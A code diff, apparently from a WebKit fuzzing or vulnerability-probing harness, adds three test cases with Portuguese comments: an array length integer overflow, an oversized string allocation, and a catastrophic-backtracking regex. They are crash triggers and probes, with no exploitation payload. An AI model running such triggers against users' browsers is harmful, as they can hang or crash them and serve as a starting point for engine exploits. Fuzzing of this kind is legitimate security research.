@@ -561,6 +561,138 @@ export const Factory = {
                 this.vulnArray = null;
             }
         });
+
+        // ══════════════════════════════════════════════════════════════
+        // 11. Array Length Integer Overflow (OOB Write/Read)
+        //     C++: JSArray.cpp / JSObject.cpp
+        //     Risco: ALTO — Tenta estourar os limites matemáticos de 32 bits
+        // ══════════════════════════════════════════════════════════════
+        register({
+            id: 'ARRAY_MATH_INTEGER_OVERFLOW',
+            category: 'Boundary',
+            risk: 'HIGH',
+            description: [
+                'Tenta causar um Integer Overflow no motor C++ ao manipular o tamanho (length)',
+                'de arrays perto do limite de 32 bits (0xFFFFFFFF). Se o C++ falhar na checagem',
+                'de transbordo ao adicionar novos elementos, ocorrerá um Heap Buffer Overflow.'
+            ].join(' '),
+
+            setup: function() {
+                this.vulnArray = [];
+                // Colocamos o array no limite máximo permitido pelo JavaScript (2^32 - 1)
+                this.vulnArray.length = 0xFFFFFFFF; 
+            },
+
+            trigger: function() {
+                try {
+                    // GATILHO: Tentamos empurrar o limite para além do tamanho máximo.
+                    // O C++ tentará fazer 0xFFFFFFFF + 1. Se a variável for de 32 bits, 
+                    // isso vira 0. O C++ pode achar que o array agora tem tamanho 0, 
+                    // mas nós estamos escrevendo no índice 0xFFFFFFFF!
+                    this.vulnArray.push(1337); 
+                    
+                    // Outro gatilho clássico de matemática de arrays:
+                    this.vulnArray.splice(0x7FFFFFFF, 0, 1, 2, 3);
+                } catch(e) {
+                    // RangeError é o comportamento normal e seguro.
+                    // Se o navegador crashar sem erro, encontramos um Buffer Overflow nativo.
+                }
+            },
+
+            probe: [
+                s => s.vulnArray.length,
+                // Se conseguirmos ler um índice além de 0xFFFFFFFF sem erro, o motor enlouqueceu.
+                s => s.vulnArray[0xFFFFFFFF + 1] 
+            ],
+
+            cleanup: function() {
+                this.vulnArray = null;
+            }
+        });
+
+        // ══════════════════════════════════════════════════════════════
+        // 12. String Allocation Overflow (WTF::String)
+        //     C++: WTFString.cpp / StringBuilder.cpp
+        //     Risco: ALTO — Um dos maiores causadores de Crash no WebKit
+        // ══════════════════════════════════════════════════════════════
+        register({
+            id: 'STRING_BUILDER_OVERFLOW',
+            category: 'Boundary',
+            risk: 'HIGH',
+            description: [
+                'Força a classe WTF::String do C++ a concatenar strings para além do limite',
+                'do alocador seguro. Um cálculo de buffer incorreto resultará em Segfault',
+                'ou OOB Read/Write.'
+            ].join(' '),
+
+            setup: function() {
+                // Criamos um bloco base gigantesco (mas dentro do limite legal)
+                // 2^28 = ~268 MB de string
+                this.baseStr = "A".repeat(0x10000000); 
+            },
+
+            trigger: function() {
+                try {
+                    // GATILHO 1: PadStart com cálculos matemáticos massivos
+                    this.corrupted = this.baseStr.padStart(0x7FFFFFFF, "B");
+                    
+                    // GATILHO 2: Substituição exponencial
+                    this.corrupted = this.baseStr.replace(/A/g, "BBBB");
+                } catch(e) {
+                    // Omitimos o RangeError ou OutOfMemory esperado
+                }
+            },
+
+            probe: [
+                s => typeof s.corrupted,
+                // Tentativa de leitura na extremidade do buffer corrompido
+                s => s.corrupted ? s.corrupted.charCodeAt(0x7FFFFFFF) : null 
+            ],
+
+            cleanup: function() {
+                this.baseStr = null;
+                this.corrupted = null;
+            }
+        });
+        
+        // ══════════════════════════════════════════════════════════════
+        // 13. RegExp Catastrophic Backtracking & Buffer Overflow
+        //     C++: Yarr (WebKit Regex Engine)
+        //     Risco: MÉDIO — Causa Denial of Service fácil, mas às vezes corrompe memória
+        // ══════════════════════════════════════════════════════════════
+        register({
+            id: 'REGEXP_ENGINE_BUFFER_OVERFLOW',
+            category: 'Boundary',
+            risk: 'MEDIUM',
+            description: [
+                'Estressa o motor de Expressões Regulares (Yarr) com padrões complexos',
+                'e grupos de captura profundos. O objetivo é causar um estouro de pilha (Stack Overflow)',
+                'ou corromper os buffers internos de captura.'
+            ].join(' '),
+
+            setup: function() {
+                // Expressão Regular projetada para causar exaustão matemática
+                this.regex = new RegExp("(a+)+b");
+                this.payload = "a".repeat(50000) + "c"; // Nunca vai bater (fail match)
+            },
+
+            trigger: function() {
+                try {
+                    // O motor C++ Yarr tentará calcular todas as combinações possíveis.
+                    // Em navegadores vulneráveis, isto estoura o ponteiro de pilha do sistema.
+                    this.result = this.regex.exec(this.payload);
+                } catch(e) {}
+            },
+
+            probe: [
+                s => s.result
+            ],
+
+            cleanup: function() {
+                this.regex = null;
+                this.payload = null;
+            }
+        });
         return list;
     }
 };
